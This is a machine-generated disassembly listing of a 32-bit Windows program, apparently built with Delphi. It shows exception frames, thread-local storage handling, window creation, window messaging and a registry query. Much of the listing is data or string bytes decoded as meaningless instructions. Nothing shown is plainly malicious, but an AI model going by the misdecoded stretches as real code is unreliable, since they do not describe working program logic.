push ebp
push sub_405d5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
mov eax ebx
xor edx edx
call sub_4047f0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d66
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
call sub_4047e4
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045b8
mov eax ebx
call sub_4047e4
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
inc eax
push eax
mov eax ebx
call sub_4047d4
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
pop ecx
pop edx
call sub_405aac
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f6c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045b8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
sub_405d6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404678
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e0a
lea eax [ ebp - 0x4 ]
call sub_404678
retn
mov eax ebx
call sub_40422c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048c0
mov eax ebx
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047e4
inc eax
push eax
mov eax ebx
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047d4
pop ecx
pop edx
call sub_405b88
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404678
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048c0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046b4
sub_405e10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e53
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047c4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405cc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e5a
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_405e60
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404164
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4053cc
push eax
call sub_40135c
mov ecx eax
mov edx esp
mov eax esi
call sub_40405c
jmp r-xdata
sub_405eb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405f1e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401324
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4041dc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c50
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f25
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
xor ebx ebx
sub_405f2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f76
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f7d
retn
mov eax rw-data
call sub_402a8c
mov eax rw-data
call sub_402a8c
mov eax rw-data
call sub_402a8c
call sub_401b90
sub_405f80
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404db8
call sub_40305c
test al al
je r-xdata
call sub_403150
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013dc
mov [ rw-data ] eax
call sub_4013d4
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_40308c
call sub_40134c
call sub_405eb8
mov [ rw-data ] eax
call sub_4013d4
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40134c
call sub_405eb8
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4013cc
mov [ rw-data ] eax
sub_406088
push ebx
call sub_406080
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_406074
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f60
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f60
sub_4060cc
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_406088
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406118
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_406054
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_40610c
mov edx rw-data
mov eax ebx
call sub_403cb4
pop ebx
retn
sub_40615c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406181
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406188
retn
sub_4061b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_4061d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4061f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406200
retn
sub_40620c
adc [ edx + 0x40 ] ah
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
or al 0x62
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
add [ edi ] 0xffffff8b
sar bh 0x25
sbb al 0x83
inc edi
add [ ebx + 0x1825ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
adc al 0x83
inc edi
add [ ebx + 0x1025ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
or al 0x83
inc edi
add [ ebx + 0x825ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
add al 0x83
inc edi
add [ ebx + 0x25ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
cld
add [ edi ] 0x8b
sar bh 0x25
clc
add [ edi ] 0x8b
sar bh 0x25
hlt
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x2025ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
sbb [ ebx - 0x3f74ffb9 ] al
jmp [ EnterCriticalSection@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx + 0xc25ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
or [ ebx - 0x3f74ffb9 ] al
jmp [ FormatMessageA@IAT ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2825ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
and al 0x83
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
shl [ edx + 0x40 ] 0x0
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x1c25ffc0 ] cl
add [ edi ] 0xffffff8b
mov eax eax
add ecx [ edx ]
inc eax
add [ ebx + 0x1c25ffc0 ] cl
add [ edi ] 0x8b
sar bh 0x25
sbb [ edx - 0x3f74ffb9 ] al
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
sub_406d18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_4029e4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029d4
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406d70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_4029e4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029d4
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406dc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406ebd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406ee5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406eec
retn
sub_406ef8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406f1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f24
retn
sub_406f30
push 0xf0004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh bl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh al
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh cl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ eax + 0x680000ff ] dh
jbe r-xdata
inc edi
add [ ecx + 0x680000ff ] dh
jbe r-xdata
inc edi
add [ ebx + 0x680000ff ] bh
jbe r-xdata
inc edi
add [ edx + 0x680000ff ] dh
jbe r-xdata
inc edi
add [ esi + 0x680000ff ] ah
jbe r-xdata
inc edi
add [ ebp + 0x680000ff ] ah
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] bh
inc edi
add [ ebx + 0x680000ff ] dh
jbe r-xdata
inc eax
add [ eax + 0x680000ff ] dl
jbe r-xdata
inc edi
add [ edi + 0x680000ff ] ah
jbe r-xdata
inc edi
add [ esi + 0x680000ff ] bh
jbe r-xdata
inc edi
add [ ebp + 0x680000ff ] bh
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] dh
inc edi
add [ ebp + 0x680000ff ] dh
jbe r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
jb r-xdata
add [ eax ] al
les esi [ edx + 0x40 ]
add [ ecx + 0x550000ff ] dl
mov ebp esp
inc edi
add [ eax + 0x680000ff ] ch
jbe r-xdata
inc edi
add [ edi + 0x680000ff ] bh
jbe r-xdata
inc edi
add [ esi + 0x680000ff ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
sub al 0x73
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] ch
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esi ] cl
add [ eax ] al
xor eax eax
push ebp
push sub_407265
push [ fs : eax ]
in al dx
add [ ecx + 0x680000ff ] ch
jbe r-xdata
inc edi
add [ eax + 0x680000ff ] ah
jbe r-xdata
inc edi
add [ edi + 0x680000ff ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jae r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi - 0x4567ffc0 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
insb
xor al 0x40
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004073 ] cl
add [ eax ] al
add al ah
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] bh
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi - 0x4567ffc0 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x73
mov [ fs : eax ] esp
inc [ rw-data ]
add [ edi + edi * 8 + 0x30 ] ah
add [ edx + 0x680000ff ] ch
jbe r-xdata
inc edi
add [ ecx + 0x680000ff ] ah
jbe r-xdata
inc edi
add [ eax + 0x680000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 ] bh
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] bh
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] bh
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
cmp al 0x74
lea eax [ eax ]
in al 0x73
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xor eax eax
pop edx
add eax rw-data
add [ ebx + 0x680000ff ] ch
jbe r-xdata
inc edi
add [ edx + 0x680000ff ] ah
jbe r-xdata
inc edi
add [ ecx + 0x680000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x100040 ] dl
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x73
inc eax
imul ebp [ edi + 0x6e ] 0x40738890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40726c
add [ edi + edi * 8 + 0x76680000 ] ch
inc edi
add [ ebx + 0x680000ff ] ah
jbe r-xdata
inc edi
add [ edx + 0x680000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
popad
insb
mov eax eax
xchg esp eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
je r-xdata
outsd
jb r-xdata
jmp r-xdata
add [ esi + 0x680000ff ] ch
jbe r-xdata
inc edi
add [ ebp + 0x680000ff ] ch
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] ah
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] cl
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add al dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
xor al 0x40
je r-xdata
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jb r-xdata
xor [ esi + 0x47 ] 0x0
add ebx eax
les esi [ edx + 0x40 ]
add [ edi + 0x680000ff ] ch
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
jbe r-xdata
outsd
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
movsb [ edi ] [ esi ]
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
add al dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
jb r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jne r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40770890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004076 ] dh
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
add [ eax ] al
jb r-xdata
add al dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jne r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] dl
add [ eax ] al
add [ eax + 0x64004074 ] ch
xor al 0x40
inc eax
ror [ ebp + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x100040 ] ah
add [ eax ] al
test al 0x74
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax ] dl
add [ eax ] al
add [ eax + 0x64004074 ] ch
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
